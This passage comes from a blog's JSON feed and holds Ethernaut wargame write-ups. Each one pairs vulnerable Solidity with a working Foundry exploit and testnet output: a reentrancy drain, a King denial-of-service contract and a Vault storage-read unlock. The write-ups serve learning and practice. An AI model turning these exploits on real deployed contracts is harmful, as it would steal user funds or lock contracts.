class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/ElevatorSol.sol <span class=\"nt\">--tc</span> ElevatorSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before floor:  0  Before top:  <span class=\"nb\">false  </span>After floor:  1  After top:  <span class=\"nb\">true</span><span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.012500004 gweiEstimated total gas used <span class=\"k\">for </span>script: 426394Estimated amount required: 0.000005329926705576 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x383dbadbac63394500cd74036b4db823339e68086e37cae785aa356474f585b7Contract Address: 0xde8D8FEa9ca4bb8B509d26c3319D10DDd45971cCBlock: 3692540Paid: 0.000003109736504884 ETH <span class=\"o\">(</span>248779 gas <span class=\"k\">*</span> 0.012499996 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x5deb7fb5644782b5570fa9181440860133684e910a08fe4525b5907ba5bf4c84Block: 3692540Paid: 0.000000931974701768 ETH <span class=\"o\">(</span>74558 gas <span class=\"k\">*</span> 0.012499996 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000004041711206652 ETH (323337 gas * avg 0.012499996 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-21-Elevator/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/21/elevator",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-21T00:00:00+09:00",
            "date_modified": "2025-04-21T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/20/re-entrancy",
            "title": "[Ethernaut] Re-entrancy",
            "summary": null,
            "content_text": "AnalysisThe goal is  steal all the funds from the contract.// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import \"openzeppelin-contracts-06/math/SafeMath.sol\";contract Reentrance {    using SafeMath for uint256;    mapping(address =&gt; uint256) public balances;    function donate(address _to) public payable {        balances[_to] = balances[_to].add(msg.value);    }    function balanceOf(address _who) public view returns (uint256 balance) {        return balances[_who];    }    function withdraw(uint256 _amount) public {        if (balances[msg.sender] &gt;= _amount) {            (bool result,) = msg.sender.call{value: _amount}(\"\");            if (result) {                _amount;            }            balances[msg.sender] -= _amount;        }    }    receive() external payable {}}In, withdraw()  function, sending ether before updating the balances state can lead to Reentrancy vulnerability.Solidity 0.8.30 Documentation - security considerations  üí° To avoid reentrancy, you can use the Checks-Effects-Interactions patternExploit// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import \"../src/Reentrance.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    Reentrance public reentrance_ = Reentrance(payable(0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1));    constructor() public payable {        reentrance_.donate{value: 0.001 ether}(address(this));    }    function ex() external {        reentrance_.withdraw(0.001 ether);        (bool result,) = msg.sender.call{value: 0.002 ether}(\"\");    }    receive() external payable {        reentrance_.withdraw(0.001 ether);    }}contract ReentranceSol is Script {    Reentrance public reentrance_ = Reentrance(payable(0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1));    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"Before instance balances: \", address(reentrance_).balance);        Ex ex = new Ex{value: 0.001 ether}();        ex.ex();        console.log(\"After instance balances: \", address(reentrance_).balance);        vm.stopBroadcast();    }}$ forge script script/Reentrance.sol --tc ReentranceSol --broadcast[‚†ä] Compiling...[‚†í] Compiling 1 files with Solc 0.6.12[‚†ë] Solc 0.6.12 finished in 492.00msCompiler run successful with warnings:Warning (2072): Unused local variable.script/Reentrance.sol:17:10: Warning: Unused local variable.        (bool result,) = msg.sender.call{value: 0.002 ether}(\"\");         ^---------^Script ran successfully.== Logs ==  Before instance balances:  1000000000000000  After instance balances:  0## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001001646 gweiEstimated total gas used for script: 415285Estimated amount required: 0.00000041596855911 ETH==========================‚†Ñ Sequence #1 on holesky | Waiting for pending transactions    ‚°Ä [Pending] 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252    ‚°Ä [Pending] 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06##### holesky‚úÖ  [Success] Hash: 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252Contract Address: 0x87347d80F8e415A3344cA3861A49393BC95C7F29Block: 3688507Paid: 0.000000250340138956 ETH (249932 gas * 0.001001633 gwei)##### holesky‚úÖ  [Success] Hash: 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06Block: 3688507Paid: 0.000000061895911235 ETH (61795 gas * 0.001001633 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000312236050191 ETH (311727 gas * avg 0.001001633 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>steal all the funds from the contract.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">12</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-06/math/SafeMath.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Reentrance</span> <span class=\"p\">{</span>    <span class=\"k\">using</span> <span class=\"n\">SafeMath</span> <span class=\"k\">for</span> <span class=\"kt\">uint256</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">balances</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">donate</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_to</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_to</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_to</span><span class=\"p\">].</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_who</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"nb\">balance</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_who</span><span class=\"p\">];</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;=</span> <span class=\"n\">_amount</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">result</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">.</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"n\">_amount</span><span class=\"p\">}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">_amount</span><span class=\"p\">;</span>            <span class=\"p\">}</span>            <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-=</span> <span class=\"n\">_amount</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{}</span><span class=\"p\">}</span></code></pre></div></div><p>In, <code class=\"language-plaintext highlighter-rouge\">withdraw()</code>  function, sending ether before updating the <code class=\"language-plaintext highlighter-rouge\">balances</code> state can lead to Reentrancy vulnerability.</p><p><a href=\"https://docs.soliditylang.org/en/latest/security-considerations.html#reentrancy\">Solidity 0.8.30 Documentation - security considerations</a></p><blockquote>  <p>üí° To avoid reentrancy, you can use the Checks-Effects-Interactions pattern</p></blockquote><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">12</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Reentrance.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"n\">Reentrance</span> <span class=\"k\">public</span> <span class=\"n\">reentrance_</span> <span class=\"o\">=</span> <span class=\"n\">Reentrance</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1</span><span class=\"p\">));</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">reentrance_</span><span class=\"p\">.</span><span class=\"n\">donate</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">}(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">));</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">reentrance_</span><span class=\"p\">.</span><span class=\"n\">withdraw</span><span class=\"p\">(</span><span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>        <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">result</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">.</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mf\">0.002</span> <span class=\"kc\">ether</span><span class=\"p\">}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">reentrance_</span><span class=\"p\">.</span><span class=\"n\">withdraw</span><span class=\"p\">(</span><span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">ReentranceSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Reentrance</span> <span class=\"k\">public</span> <span class=\"n\">reentrance_</span> <span class=\"o\">=</span> <span class=\"n\">Reentrance</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before instance balances: \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">reentrance_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">}();</span>        <span class=\"n\">ex</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After instance balances: \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">reentrance_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/Reentrance.sol <span class=\"nt\">--tc</span> ReentranceSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†í] Compiling 1 files with Solc 0.6.12<span class=\"o\">[</span>‚†ë] Solc 0.6.12 finished <span class=\"k\">in </span>492.00msCompiler run successful with warnings:Warning <span class=\"o\">(</span>2072<span class=\"o\">)</span>: Unused <span class=\"nb\">local </span>variable.script/Reentrance.sol:17:10: Warning: Unused <span class=\"nb\">local </span>variable.        <span class=\"o\">(</span>bool result,<span class=\"o\">)</span> <span class=\"o\">=</span> msg.sender.call<span class=\"o\">{</span>value: 0.002 ether<span class=\"o\">}(</span><span class=\"s2\">\"\"</span><span class=\"o\">)</span><span class=\"p\">;</span>         ^---------^Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before instance balances:  1000000000000000  After instance balances:  0<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001001646 gweiEstimated total gas used <span class=\"k\">for </span>script: 415285Estimated amount required: 0.00000041596855911 ETH<span class=\"o\">==========================</span>‚†Ñ Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ‚°Ä <span class=\"o\">[</span>Pending] 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252    ‚°Ä <span class=\"o\">[</span>Pending] 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06<span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252Contract Address: 0x87347d80F8e415A3344cA3861A49393BC95C7F29Block: 3688507Paid: 0.000000250340138956 ETH <span class=\"o\">(</span>249932 gas <span class=\"k\">*</span> 0.001001633 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06Block: 3688507Paid: 0.000000061895911235 ETH <span class=\"o\">(</span>61795 gas <span class=\"k\">*</span> 0.001001633 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000312236050191 ETH (311727 gas * avg 0.001001633 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-20-Re-entrancy/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/20/re-entrancy",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","reentrancy"],
            
            "date_published": "2025-04-20T00:00:00+09:00",
            "date_modified": "2025-04-20T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/20/king",
            "title": "[Ethernaut] King",
            "summary": null,
            "content_text": "AnalysisThe goals are  reclaim kingship  avoid a self proclamation.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract King {    address king;    uint256 public prize;    address public owner;    constructor() payable {        owner = msg.sender;        king = msg.sender;        prize = msg.value;    }    receive() external payable {        require(msg.value &gt;= prize || msg.sender == owner);        payable(king).transfer(msg.value);        king = msg.sender;        prize = msg.value;    }    function _king() public view returns (address) {        return king;    }}Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/King.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(King king_) payable {        address(king_).call{value: king_.prize()}(\"\");    }}contract KingSol is Script {    King public king_ = King(payable(0x4Ee0991775535F17Dd47879adA5c2fca799bCA0e));    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"Befor king: \", king_._king());        new Ex{value: king_.prize()}(king_);        console.log(\"After king: \", king_._king());        vm.stopBroadcast();    }}$ forge script script/King.sol --tc KingSol --broadcast[‚†ä] Compiling...[‚†∞] Compiling 1 files with Solc 0.8.29[‚†î] Solc 0.8.29 finished in 278.71msCompiler run successful with warnings:Warning (9302): Return value of low-level calls not used.  --&gt; script/King.sol:10:9:   |10 |         address(king_).call{value: king_.prize()}(\"\");   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.== Logs ==  Befor king:  0xDed9f3474fe5f075Ed7953f36a493928b1BD9f31  After king:  0x18170C5Ed18ceE0a24a327841eFfa6eB745A050a## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001002373 gweiEstimated total gas used for script: 134730Estimated amount required: 0.00000013504971429 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xa7cae242656175eed004f4d74d52f36a11124dba4b5026ae6d20cc29bee65ac9Contract Address: 0x18170C5Ed18ceE0a24a327841eFfa6eB745A050aBlock: 3687281Paid: 0.000000103884106235 ETH (103639 gas * 0.001002365 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000103884106235 ETH (103639 gas * avg 0.001002365 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goals are</p><ol>  <li>reclaim kingship</li>  <li>avoid a self proclamation.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">King</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"n\">king</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">prize</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">king</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">prize</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&gt;=</span> <span class=\"n\">prize</span> <span class=\"o\">||</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">);</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">king</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">);</span>        <span class=\"n\">king</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">prize</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">_king</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">king</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/King.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">King</span> <span class=\"n\">king_</span><span class=\"p\">)</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">king_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"n\">king_</span><span class=\"p\">.</span><span class=\"n\">prize</span><span class=\"p\">()}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">KingSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">King</span> <span class=\"k\">public</span> <span class=\"n\">king_</span> <span class=\"o\">=</span> <span class=\"n\">King</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x4Ee0991775535F17Dd47879adA5c2fca799bCA0e</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Befor king: \"</span><span class=\"p\">,</span> <span class=\"n\">king_</span><span class=\"p\">.</span><span class=\"n\">_king</span><span class=\"p\">());</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"n\">king_</span><span class=\"p\">.</span><span class=\"n\">prize</span><span class=\"p\">()}(</span><span class=\"n\">king_</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After king: \"</span><span class=\"p\">,</span> <span class=\"n\">king_</span><span class=\"p\">.</span><span class=\"n\">_king</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/King.sol <span class=\"nt\">--tc</span> KingSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†∞] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>‚†î] Solc 0.8.29 finished <span class=\"k\">in </span>278.71msCompiler run successful with warnings:Warning <span class=\"o\">(</span>9302<span class=\"o\">)</span>: Return value of low-level calls not used.  <span class=\"nt\">--</span><span class=\"o\">&gt;</span> script/King.sol:10:9:   |10 |         address<span class=\"o\">(</span>king_<span class=\"o\">)</span>.call<span class=\"o\">{</span>value: king_.prize<span class=\"o\">()}(</span><span class=\"s2\">\"\"</span><span class=\"o\">)</span><span class=\"p\">;</span>   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Befor king:  0xDed9f3474fe5f075Ed7953f36a493928b1BD9f31  After king:  0x18170C5Ed18ceE0a24a327841eFfa6eB745A050a<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001002373 gweiEstimated total gas used <span class=\"k\">for </span>script: 134730Estimated amount required: 0.00000013504971429 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xa7cae242656175eed004f4d74d52f36a11124dba4b5026ae6d20cc29bee65ac9Contract Address: 0x18170C5Ed18ceE0a24a327841eFfa6eB745A050aBlock: 3687281Paid: 0.000000103884106235 ETH <span class=\"o\">(</span>103639 gas <span class=\"k\">*</span> 0.001002365 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000103884106235 ETH (103639 gas * avg 0.001002365 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-20-King/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/20/king",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-20T00:00:00+09:00",
            "date_modified": "2025-04-20T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/19/vault",
            "title": "[Ethernaut] Vault",
            "summary": null,
            "content_text": "AnalysisThe goal is  Unlock the vault// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault {    bool public locked;    bytes32 private password;    constructor(bytes32 _password) {        locked = true;        password = _password;    }    function unlock(bytes32 _password) public {        if (password == _password) {            locked = false;        }    }}Because the blockchain is transparent, secret keys cannot be stored on it.Exploit$ cast storage 0x65E998C6f70c90f149553c967BA4a38Ecc6213A9 10x412076657279207374726f6e67207365637265742070617373776f7264203a29// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Vault.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract ValutSol is Script {    Vault public vault_ = Vault(0x65E998C6f70c90f149553c967BA4a38Ecc6213A9);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        vault_.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);        vm.stopBroadcast();    }}$ forge script script/VaultSol.sol 